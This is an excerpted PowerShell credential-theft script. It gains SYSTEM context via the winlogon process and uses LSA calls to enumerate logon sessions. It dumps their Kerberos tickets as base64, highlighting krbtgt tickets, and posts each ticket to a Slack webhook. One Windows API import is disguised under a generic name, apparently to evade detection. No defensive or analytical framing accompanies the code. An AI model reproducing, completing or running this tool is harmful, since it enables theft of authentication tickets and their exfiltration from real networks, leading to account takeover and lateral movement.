...
function Invoke-AsSystem {
    $wp = Get-Process -Name "winlogon" | Select-Object -First 1 -ExpandProperty Id

    if (($processHandle = [impsys.win32]::OpenProcess(
            0x400,
            $true,
            [Int32]$wp)) -eq [IntPtr]::Zero)
    {
...
Function LsaRegisterLogonProcess()
    {
       ...
       [int]$ret = [ticket.dump]::LsaRegisterLogonProcess($LSAString,[ref]$las,[ref]$SecurityMode)
       if ($ret -ne 0){
...
function LsaConnectUntrusted {
    $las = New-Object System.IntPtr
    [int]$retcode = [ticket.dump]::SomeRandomMethod([ref]$las)
    if ($retcode -ne 0){
...
Function RunningAsAdmin()
{
    ...
    if($princ.IsInRole("Administrators") -or $princ.IsInRole("??????????????") -or $user.Name -match $systemname){return $true}
    else{return $false}
}
...
Function EnumerateLogonSessions()
    ...
    {
        write-host "[+] Sending data to Slack...."
        foreach($sessioncred in $sessioncreds)
        {
            ...
            if((@($sessioncred).Count -gt 0) -and ($sessioncred[0].LogonSession[0].LogonID.LowPart -ne "0") )
            {
                ...
                $ticketCount = @($sessioncred).Count
                $message += "[*] Enumerated $ticketCount ticket(s)`n"

                # Send the summary message to Slack
                $summaryPayload = @{ text = $message } | ConvertTo-Json -Depth 3
                $null = Invoke-RestMethod -Uri $slackWebhookUrl -Method Post -Body $summaryPayload -ContentType 'application/json'
                
                foreach ($ticket in $sessioncred) {
                $ticketMessage  = "---------------------------------------------------------------------`n"
                if ($ticket.ServerName -match 'krbtgt') {
                      $formattedServerName = ":rotating_light: *$($ticket.ServerName)*"
                } else {
                      $formattedServerName = "*$($ticket.ServerName)*"
                }
                $ticketMessage += "Service Name: $formattedServerName`n"
                $ticketMessage += "Client Name: *$($ticket.ClientName)@$($ticket.ClientRealm)*`n"
                $ticketMessage += "EncryptionType: $([ticket.dump+EncTypes]$ticket.EncryptionType)`n"
                $ticketMessage += "Start/End/MaxRenew: $($ticket.StartTime); $($ticket.EndTime); $($ticket.RenewTime)`n"
                $ticketMessage += "Server Name: $($ticket.ServerName.split('/')[1])@$($ticket.ServerRealm)`n"               
                $ticketMessage += "Flags: $($ticket.TicketFlags)`n"
                
                if ($ticket.SessionKeyType) {
                    $ticketMessage += "Session Key Type: $($ticket.SessionKeyType)`n"
                }

                $ticketMessage += "Ticket: $($ticket.Ticketb64)`n"

                # Send message to Slack
                $payload = @{ text = $ticketMessage } | ConvertTo-Json -Depth 3
                $null = Invoke-RestMethod -Uri $slackWebhookUrl -Method Post -Body $payload -ContentType 'application/json'
               }
            }
        }
      }
      write-host "[+] Data has been delivered"
    }
function main{
    ...
    [DllImport("secur32.dll", EntryPoint = "LsaConnectUntrusted")]
    public static extern int SomeRandomMethod([Out] out IntPtr LsaHandle);
...
"@
    ...
    # Connecting to AP
    $retcode = [ticket.dump]::LsaLookupAuthenticationPackage($las,[ref]$LSAString,[ref]$authpckg)
    if ($retcode -ne 0){
    ...
    foreach($luid in EnumerateLogonSessions){
        if ($([System.Convert]::ToString($luid.LowPart,16) -eq 0x0)){
           continue;
            ...
            $retcode = [ticket.dump]::LsaCallAuthenticationPackage($las,$authpckg,$tQueryPtr,[System.Runtime.InteropServices.Marshal]::SizeOf($ticketCacheRequest),[ref]$ticketsPointer,[ref]$returnBufferLength,[ref]$protocolStatus)
            ...
            if($count2 -ne 0)
            {
                ...
                for($j = 0;$j -lt $count2;$j++)
                {
                    ...
                    $InfoObj = (ExtractTicket $las $authpckg $ticketCacheRequest.LogonId $ticket.ServerName $ticketCacheResult.TicketFlags $ticket)
    ...
    [ticket.dump]::LsaDeregisterLogonProcess($las)|Out-Null
